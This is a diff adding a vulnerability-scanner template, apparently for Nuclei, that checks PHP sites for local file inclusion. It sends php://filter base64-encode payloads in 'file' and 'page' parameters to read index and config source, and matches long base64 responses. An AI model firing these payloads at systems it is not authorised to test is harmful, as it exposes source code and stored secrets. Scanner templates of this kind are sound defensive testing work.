@@ -1,0 +1,22 @@
+id: whai-lfi-php-filter
+
+info:
+  name: LFI via PHP Filter Wrapper
+  author: whitehat-ai
+  severity: critical
+  description: Tests LFI using php://filter to read source code
+  tags: lfi,php,filter,critical
+  classification:
+    cwe-id: CWE-22
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?file=php://filter/convert.base64-encode/resource=index"
+      - "{{BaseURL}}/?page=php://filter/convert.base64-encode/resource=config"
+
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "^[A-Za-z0-9+/=]{50,}"
